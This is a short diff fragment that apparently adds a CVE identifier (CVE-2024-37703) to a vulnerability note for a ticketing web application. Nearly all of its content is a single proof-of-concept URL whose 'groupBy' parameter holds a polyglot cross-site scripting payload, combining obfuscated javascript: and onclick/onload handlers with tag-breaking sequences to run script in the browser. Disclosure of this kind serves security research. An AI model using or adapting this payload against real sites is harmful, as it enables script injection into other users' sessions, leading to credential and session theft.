@@ -1,3 +1,5 @@
+CVE-2024-37703
+
 Vulnerability:
 
 URL:  ```https://192.168.124.138/tickets/showList?currentClient=0&groupBy=jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert(123) )%0D%0A%0d%0a</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert(123)//>\x3e```
